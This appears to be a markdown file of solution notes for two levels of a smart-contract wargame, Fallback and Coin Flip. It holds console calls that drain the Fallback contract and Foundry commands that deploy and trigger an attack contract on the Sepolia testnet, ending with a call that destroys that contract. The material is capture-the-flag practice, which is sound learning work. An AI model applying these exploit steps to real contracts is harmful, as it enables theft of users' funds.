## Fallback

```js
await contract.contribute.sendTransaction({ value: toWei("0.00001") });
await contract.getContribution().then(result => result.toString()); // convert from BigNumber object
await contract.sendTransaction({ value: toWei("0.00001") }); // fallback
await contract.withdraw()
```

---

## Coin Flip

### Test

```shell
$ forge test -vvv --match-path "test/AttackCoinFlip*"
```

### Deploy

```shell
$ forge create  \
    --rpc-url 'https://ethereum-sepolia-rpc.publicnode.com' \
    --constructor-args '0x76A6296aE007268c3007abc5248cDcC40E693a11' '57896044618658097711785492504343953926634992332820282019728792003956564819968' \
    --interactive \
    src/AttackCoinFlip.sol:AttackCoinFlip
```

### Cast

```shell
export AttackCoinFlip_address=0x...;
# Build the transaction to call the `attack()` function in the `AttackCoinFlip` contract
$ cast mktx \
    --rpc-url 'https://ethereum-sepolia-rpc.publicnode.com' \
    --value 0.0001ether \
    --interactive \
    "$AttackCoinFlip_address" \
    "attack()"
$ cast publish \
    --rpc-url 'https://ethereum-sepolia-rpc.publicnode.com' \
    <tx>
# Or we can build and publish the transaction in one command
$ cast send \
    --rpc-url 'https://ethereum-sepolia-rpc.publicnode.com' \
    --value 0.0001ether \
    --interactive \
    "$AttackCoinFlip_address" \
    "attack()"
# Finishing the attack and destroying the contract
$ cast send \
    --rpc-url 'https://ethereum-sepolia-rpc.publicnode.com' \
    --interactive \
    "$AttackCoinFlip_address" \
    "finish()"
```

---
